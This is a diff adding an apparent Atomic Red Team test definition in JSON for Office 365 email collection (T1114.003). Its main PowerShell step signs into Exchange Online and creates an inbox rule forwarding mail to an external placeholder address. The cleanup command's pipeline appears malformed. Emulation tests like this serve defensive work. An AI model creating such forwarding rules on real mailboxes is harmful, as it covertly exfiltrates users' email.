@@ -1,0 +1,123 @@
+{
+  "id": "3234117e-151d-4254-9150-3d0bac41e38c",
+  "name": "Office365 - Email Forwarding",
+  "description": "Creates a new Inbox Rule to forward emails to an external user via the \"ForwardTo\" property of the New-InboxRule Powershell cmdlet.\n",
+  "platforms": [
+    "office-365"
+  ],
+  "steps": [
+    {
+      "id": "efab2ed2-da7b-4cbb-9666-ca835b7faaba",
+      "type": "execute-command",
+      "data": {
+        "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nNew-InboxRule -Name \"#{rule_name}\" -ForwardTo \"#{forwarding_email}\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "f6fd2353-8062-4489-b592-ec0d56aa3f6f",
+      "type": "execute-command",
+      "data": {
+        "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nGet-InboxRule | Where-Object { $_.Name -eq \"#{rule_name}\" | ForEach-Object { Remove-InboxRule -Identity $_.Identity -Force -Confirm:$False }\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "fe93b09a-7a3e-44f3-9870-0d4fd0e3376d",
+      "name": "Check dependency 1/1",
+      "description": "ExchangeOnlineManagement PowerShell module must be installed. Your user must also have an Exchange license. \n",
+      "type": "execute-command",
+      "data": {
+        "command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "0ea47613-f5c1-4ca3-b71c-3190b361e051",
+      "name": "Resolve dependency 1/1",
+      "description": "ExchangeOnlineManagement PowerShell module must be installed. Your user must also have an Exchange license. \n",
+      "type": "execute-command",
+      "data": {
+        "command": "Install-Module -Name ExchangeOnlineManagement         \nImport-Module ExchangeOnlineManagement\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "3c07172b-fa66-44dd-9500-50467680eddf",
+      "name": "Re-check dependency 1/1",
+      "description": "ExchangeOnlineManagement PowerShell module must be installed. Your user must also have an Exchange license. \n",
+      "type": "execute-command",
+      "data": {
+        "command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "efab2ed2-da7b-4cbb-9666-ca835b7faaba",
+      "p": "on-success",
+      "o": "f6fd2353-8062-4489-b592-ec0d56aa3f6f"
+    },
+    {
+      "s": "efab2ed2-da7b-4cbb-9666-ca835b7faaba",
+      "p": "on-failure",
+      "o": "f6fd2353-8062-4489-b592-ec0d56aa3f6f"
+    },
+    {
+      "s": "fe93b09a-7a3e-44f3-9870-0d4fd0e3376d",
+      "p": "on-success",
+      "o": "efab2ed2-da7b-4cbb-9666-ca835b7faaba"
+    },
+    {
+      "s": "fe93b09a-7a3e-44f3-9870-0d4fd0e3376d",
+      "p": "on-failure",
+      "o": "0ea47613-f5c1-4ca3-b71c-3190b361e051"
+    },
+    {
+      "s": "0ea47613-f5c1-4ca3-b71c-3190b361e051",
+      "p": "on-success",
+      "o": "3c07172b-fa66-44dd-9500-50467680eddf"
+    },
+    {
+      "s": "3c07172b-fa66-44dd-9500-50467680eddf",
+      "p": "on-failure",
+      "o": "efab2ed2-da7b-4cbb-9666-ca835b7faaba"
+    }
+  ],
+  "tags": [
+    "T1114.003",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "username",
+      "type": "string",
+      "description": "office-365 username",
+      "value": ""
+    },
+    {
+      "name": "password",
+      "type": "string",
+      "description": "office-365 password",
+      "value": ""
+    },
+    {
+      "name": "rule_name",
+      "type": "string",
+      "description": "email rule name",
+      "value": "Atomic Red Team Email Rule"
+    },
+    {
+      "name": "forwarding_email",
+      "type": "string",
+      "description": "destination email addresses",
+      "value": "Atomic_Operator@fakeemail.aq"
+    }
+  ]
+}
